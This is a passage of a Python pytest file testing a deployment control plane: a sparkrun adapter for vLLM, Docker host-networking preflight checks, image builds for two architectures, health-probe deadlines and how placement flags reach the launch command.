        assert proc.returncode == 0, "%s: %s" % (runtime, proc.stdout + proc.stderr)


@needs_sparkrun
def test_we_can_still_talk_to_the_sparkrun_we_verified_against():
    from control_plane.deploy.flags import SPARKRUN_VERIFIED_VERSION

    version = SparkrunAdapter().version()
    assert version, "sparkrun --version returned nothing"
    if version != SPARKRUN_VERIFIED_VERSION:
        pytest.skip(
            "sparkrun %s installed, flags verified against %s; re-verify "
            "control_plane/deploy/flags.py" % (version, SPARKRUN_VERIFIED_VERSION)
        )


def test_missing_sparkrun_fails_with_an_actionable_message(tmp_path):
    """No silent fallback to launching vLLM by hand."""
    adapter = SparkrunAdapter(recipe_dir=tmp_path, binary="sparkrun-does-not-exist")
    assert adapter.available() is False
    with pytest.raises(SparkrunNotInstalled) as excinfo:
        adapter.require()
    message = str(excinfo.value)
    assert "uv tool install sparkrun" in message
    assert "will not launch vLLM" in message

    manager = DeploymentManager(
        adapter, FakeRegistry(fx.SPARK_01), state_dir=tmp_path, autostart=False
    )
    with pytest.raises(SparkrunNotInstalled):
        manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
    assert manager.list() == []


def test_check_job_survives_a_missing_sparkrun(tmp_path):
    """Reconcile must not blow up when sparkrun is absent.

    M-16, the ``available()`` branch: this used to assert ``running is
    False``, i.e. "confirmed not running". That conflated "this process
    cannot find the sparkrun binary right now" with "the workload is
    definitely gone" -- the exact bug M-16 flags for the TIMEOUT branch,
    just reached a different way (a control plane that restarts into an
    environment temporarily missing the binary would retire every live
    deployment it could not also reach over HTTP). ``running`` must be
    None: absence of evidence, not evidence of absence. See
    test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable
    below for the same fix exercised through reconcile().
    """
    adapter = SparkrunAdapter(recipe_dir=tmp_path, binary="sparkrun-does-not-exist")
    result = adapter.check_job("sparkrun_abc")
    assert result["running"] is None
    assert "install" in result["error"].lower()
    assert adapter.is_running("sparkrun_abc") is None


# ==========================================================================
# Docker. Host networking is the one that silently ruins the demo.
# ==========================================================================


def _free_ports(count: int) -> list[int]:
    """Ports nothing is listening on right now.

    Host networking shares the host's ports, so a hardcoded one can collide
    with anything else on the machine -- including another agent's tests.
    """
    import socket as _socket

    sockets = []
    try:
        for _ in range(count):
            sock = _socket.socket()
            sock.bind(("0.0.0.0", 0))
            sockets.append(sock)
        return [s.getsockname()[1] for s in sockets]
    finally:
        for sock in sockets:
            sock.close()


def _preflight_module():
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "derate_preflight", REPO / "docker" / "preflight.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_preflight_names_the_flag_in_its_refusal():
    module = _preflight_module()
    assert "--network host" in module.BRIDGE_MESSAGE
    assert "network_mode: host" in module.BRIDGE_MESSAGE
    assert "mDNS" in module.BRIDGE_MESSAGE


def test_preflight_passes_outside_a_container(monkeypatch):
    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: False)
    import io

    assert module.check(stream=io.StringIO()) is True


def test_preflight_refuses_when_every_interface_is_a_veth(monkeypatch):
    import io

    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0"])
    monkeypatch.setattr(module, "is_veth", lambda name: True)
    monkeypatch.setattr(module.Path, "exists", lambda self: False)

    stream = io.StringIO()
    assert module.check(stream=stream) is False
    assert "--network host" in stream.getvalue()


def test_preflight_accepts_a_visible_host_bridge(monkeypatch):
    import io

    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0", "docker0"])
    monkeypatch.setattr(module.Path, "exists", lambda self: False)
    monkeypatch.setattr(module, "is_veth", lambda name: name == "eth0")
    assert module.check(stream=io.StringIO()) is True


def test_preflight_override_is_a_loud_warning_not_silence(monkeypatch):
    import io

    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0"])
    monkeypatch.setattr(module, "is_veth", lambda name: True)
    monkeypatch.setattr(module.Path, "exists", lambda self: False)
    monkeypatch.setenv("DERATE_ALLOW_BRIDGE", "1")

    stream = io.StringIO()
    assert module.check(stream=stream) is True
    assert "WARNING" in stream.getvalue()
    assert "will not work" in stream.getvalue()


def _uncommented(text: str) -> str:
    return "\n".join(
        line for line in text.splitlines() if not line.lstrip().startswith("#")
    )


def test_dockerfile_ships_one_image_with_the_required_shape():
    dockerfile = (REPO / "Dockerfile").read_text()
    directives = _uncommented(dockerfile)
    # One image, one entrypoint. No coordinator/worker split, no second service.
    assert dockerfile.count("\nENTRYPOINT") == 1
    assert "--target" not in dockerfile
    # Health check on /agent/health, which exists in both roles.
    assert "/agent/health" in directives
    assert "/api/cluster" not in directives
    # Persisted state.
    assert 'VOLUME ["/data"]' in dockerfile
    # Every environment variable has a working default.
    for var in ("DERATE_ROLE", "DERATE_PORT", "DERATE_AGENT_PORT"):
        assert "%s=" % var in dockerfile
    assert "DERATE_TOKEN" in dockerfile
    assert "DERATE_JOIN" in dockerfile


def test_compose_uses_host_networking_and_restarts():
    compose = (REPO / "compose.yaml").read_text()
    settings = _uncommented(compose)
    assert "network_mode: host" in settings
    assert "restart: unless-stopped" in settings
    assert "/agent/health" in settings
    assert "/api/cluster" not in settings


def test_build_script_builds_both_architectures():
    """GB10 is arm64. Skipping it means the heterogeneous case does not work."""
    script = (REPO / "docker" / "build.sh").read_text()
    assert "linux/amd64,linux/arm64" in script
    assert "buildx" in script


@needs_docker
def test_image_refuses_bridge_networking():
    """The acceptance test for the trap: started on a bridge, the container
    exits with a message naming --network host."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    proc = subprocess.run(
        ["docker", "run", "--rm", "--network", "bridge", "derate/node:test"],
        capture_output=True, text=True, timeout=120,
    )
    output = proc.stdout + proc.stderr
    assert proc.returncode != 0, output
    assert "--network host" in output
    assert "mDNS" in output


@needs_docker
def test_image_starts_on_host_networking_and_answers_agent_health():
    """docker run --network host, no configuration, working health endpoint."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    name = "derate-acceptance-%d-%d" % (os.getpid(), int(time.time()))
    subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)
    # Two distinct ports, so the two-port path is what gets exercised, and
    # free ones because host networking shares the host's ports -- a fixed
    # port would probe whatever else happens to be listening on it.
    ui_port, agent_port = _free_ports(2)
    started = subprocess.run(
        [
            # No --rm: the container's log is the evidence when this fails,
            # and --rm throws it away. Cleaned up in the finally below.
            # --restart is exercised through compose; it conflicts with --rm.
            "docker", "run", "-d", "--name", name,
            "--network", "host",
            "-e", "DERATE_PORT=%d" % ui_port,
            "-e", "DERATE_AGENT_PORT=%d" % agent_port,
            "derate/node:test",
        ],
        capture_output=True, text=True, timeout=120,
    )
    assert started.returncode == 0, started.stdout + started.stderr

    def logs() -> str:
        proc = subprocess.run(["docker", "logs", name], capture_output=True, text=True)
        return proc.stdout + proc.stderr

    def running() -> bool:
        proc = subprocess.run(
            ["docker", "inspect", "--format", "{{.State.Running}}", name],
            capture_output=True, text=True,
        )
        return proc.stdout.strip() == "true"

    try:
        # Our container, not something else that happens to answer. Without
        # this the probe below can pass against an unrelated listener while
        # our own container has already exited.
        assert wait_for(running, timeout=30.0), logs()

        import urllib.request

        from control_plane.deploy.health import probe as real_probe

        # /agent/health exists in both roles and lives on the agent port.
        agent_url = "http://127.0.0.1:%d" % agent_port
        assert wait_for(lambda: real_probe(agent_url, timeout=2.0)[0], timeout=60.0), logs()
        with urllib.request.urlopen("%s/agent/health" % agent_url, timeout=5) as response:
            assert json.load(response)["status"] == "ok"

        # The UI is served from the same origin as the API. No second service.
        with urllib.request.urlopen("http://127.0.0.1:%d/" % ui_port, timeout=5) as response:
            assert response.status == 200

        # Preflight confirmed host networking rather than skipping the check.
        assert "host networking confirmed" in logs()

        # /data is laid out and sparkrun's job metadata is inside the volume,
        # so a restarted container can still find what this node launched.
        listing = subprocess.run(
            ["docker", "exec", name, "sh", "-c", "ls /data; readlink /root/.cache/sparkrun"],
            capture_output=True, text=True, timeout=30,
        ).stdout
        assert "deployments" in listing and "recipes" in listing
        assert "/data/sparkrun-cache" in listing

        # A restarted container re-resolves its role.
        subprocess.run(["docker", "restart", name], capture_output=True, timeout=90)
        assert wait_for(lambda: real_probe(agent_url, timeout=2.0)[0], timeout=60.0), logs()
    finally:
        subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)


@needs_docker
@pytest.mark.slow
def test_image_builds_for_both_architectures():
    """GB10 is arm64, the workstation is usually amd64. An image missing one
    means the heterogeneous case does not work at all.

    Slow: a cold buildx run is minutes. Deselect with -m 'not slow'.
    """
    if subprocess.run(
        ["docker", "buildx", "version"], capture_output=True
    ).returncode != 0:
        pytest.skip("docker buildx not available")

    # Through the shipped script, so this covers the builder it creates too:
    # the default docker driver cannot do multi-platform at all.
    proc = subprocess.run(
        ["bash", str(REPO / "docker" / "build.sh")],
        capture_output=True, text=True, timeout=3600,
        env={**os.environ, "SKIP_UI": "1", "TAG": "arch-test"},
        cwd=str(REPO),
    )
    output = proc.stdout + proc.stderr
    if proc.returncode != 0:
        if "exec format error" in output or "binfmt" in output.lower():
            pytest.skip(
                "no QEMU emulation on this host; run "
                "`docker run --privileged --rm tonistiigi/binfmt --install all`"
            )
        pytest.fail(output[-4000:])
    assert "linux/amd64" in output and "linux/arm64" in output


@needs_docker
def test_image_says_which_variable_moves_a_port_collision():
    """Host networking shares the host's ports. A collision must not be a
    traceback."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    import socket as _socket

    holder = _socket.socket()
    holder.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    holder.bind(("0.0.0.0", 0))
    holder.listen(1)
    taken = holder.getsockname()[1]
    # An unrelated listener on the UI port would make the container exit for
    # the wrong reason, so give it a free one.
    (ui_port,) = _free_ports(1)
    try:
        proc = subprocess.run(
            [
                "docker", "run", "--rm", "--network", "host",
                "-e", "DERATE_PORT=%d" % ui_port,
                "-e", "DERATE_AGENT_PORT=%d" % taken,
                "derate/node:test",
            ],
            capture_output=True, text=True, timeout=120,
        )
        output = proc.stdout + proc.stderr
        assert proc.returncode != 0
        assert "already in use" in output
        assert "DERATE_AGENT_PORT" in output
        assert "Traceback" not in output
    finally:
        holder.close()


# ---------------------------------------------------------------------------
# M-15 arbitration (orchestrator): the probe phase shares ONE absolute
# deadline, and past MAX_PROBE_WORKERS coverage rotates instead of truncating.
# ---------------------------------------------------------------------------


def _fake_probe_records(n):
    import types

    return [
        types.SimpleNamespace(
            deployment=types.SimpleNamespace(
                deployment_id="d-probe-%d" % i, backend_url="http://10.0.0.%d:8100/v1" % i
            )
        )
        for i in range(n)
    ]


def test_concurrently_hanging_probes_share_one_absolute_deadline(tmp_path):
    """Eight probes that genuinely never return must cost ~one hard deadline,
    not eight: a serial per-thread join would accumulate k * deadline."""
    import time as _time

    def hanging_probe(backend_url, timeout=3.0):
        _time.sleep(12)
        return True, None

    manager = make_manager(tmp_path, probe=hanging_probe)
    records = _fake_probe_records(8)
    started = _time.monotonic()
    results = manager._probe_backends(records, probe_timeout=0.5)
    elapsed = _time.monotonic() - started

    assert len(results) == 8
    for ok, detail in results.values():
        assert ok is False
        assert "did not return" in detail
    # hard deadline is probe_timeout * len(HEALTH_PATHS) = ~1s; a serial
    # join would take >= 8s. Generous margin for thread scheduling.
    assert elapsed < 4.0, "probe phase accumulated per-thread deadlines: %.2fs" % elapsed


def test_probe_rotation_covers_every_deployment_past_the_worker_cap(tmp_path, monkeypatch):
    """Past MAX_PROBE_WORKERS the window rotates: nothing is permanently
    unprobed, it is just probed every ceil(n/cap) ticks."""
    import control_plane.deploy.manager as manager_module

    probed = []

    def recording_probe(backend_url, timeout=3.0):
        probed.append(backend_url)
        return True, None

    monkeypatch.setattr(manager_module, "MAX_PROBE_WORKERS", 2)
    manager = make_manager(tmp_path, probe=recording_probe)
    records = _fake_probe_records(5)

    per_call = []
    for _ in range(3):
        results = manager._probe_backends(records, probe_timeout=1.0)
        per_call.append(set(results))

    assert all(len(ids) <= 2 for ids in per_call), "window exceeded the cap"
    covered = set().union(*per_call)
    assert covered == {r.deployment.deployment_id for r in records}, (
        "rotation must reach every deployment within ceil(n/cap) ticks"
    )


def test_bare_yaml_null_spellings_are_rejected_as_command_values():
    """'~', '.' and '..' pass no gate: '~' is YAML null and shell home."""
    from control_plane.deploy.recipes import _check_command_safe

    for bad in ("~", ".", ".."):
        with pytest.raises(ValueError):
            _check_command_safe(bad, "model_id")
    for good in (
        "meta-llama/Llama-3.3-70B-Instruct",
        "/data/models/x.gguf",
        "~/models/llama",
        "./relative/model-dir",
        "a",
    ):
        _check_command_safe(good, "model_id")


# ==========================================================================
# Acceptance: an operator-chosen placement reaches sparkrun as chosen.
#
# Verified against sparkrun 0.2.40 with --dry-run: `--tp`/`--pp` are passed
# through independently of `--hosts`, and a degree that does not fill the host
# list is launched as given without complaint. That is why the gateway refuses
# an under-filled selection itself -- nothing downstream will.
# ==========================================================================


def test_operator_ordered_hosts_reach_sparkrun_in_that_order(tmp_path):
    """The first node is the pipeline head. Sorting anywhere would move it."""
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    plan = dataclasses.replace(
        fx.pp2_plan(), node_ids=[fx.SPARK_02.node_id, fx.SPARK_01.node_id]
    )
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[argv.index("--hosts") + 1] == "%s,%s" % (
        fx.SPARK_02.address,
        fx.SPARK_01.address,
    )


def test_manual_degrees_reach_both_the_recipe_and_the_command_line(tmp_path):
    """Keeps manual degrees from quietly becoming a lie.

    Three hops carry them -- the sparkrun CLI flags, the recipe `defaults:`,
    and the runtime command template -- and a manual degree is only honest if
    all three agree. If `flags.py` is ever edited, this is what notices.
    """
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    plan = dataclasses.replace(
        fx.pp2_plan(),
        kind=ParallelismKind.TENSOR,
        tensor_parallel=2,
        pipeline_parallel=1,
    )
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[argv.index("--tp") + 1] == "2"
    assert argv[argv.index("--pp") + 1] == "1"

    # `render_command` is pure and writes nothing, so the recipe is
    # synthesized here rather than read back off disk.
    recipe = recipes.synthesize(
        fx.GPT_OSS_120B,
        plan,
        "vllm",
        65536,
        512,
        "gpt-oss-120b",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path / "recipes",
    ).content
    assert "tensor_parallel: 2" in recipe
    assert "pipeline_parallel: 1" in recipe
    # The template has to actually interpolate them, or the flags above are
    # accepted and silently do nothing.
    assert "--tensor-parallel-size {tensor_parallel}" in recipe
    assert "--pipeline-parallel-size {pipeline_parallel}" in recipe
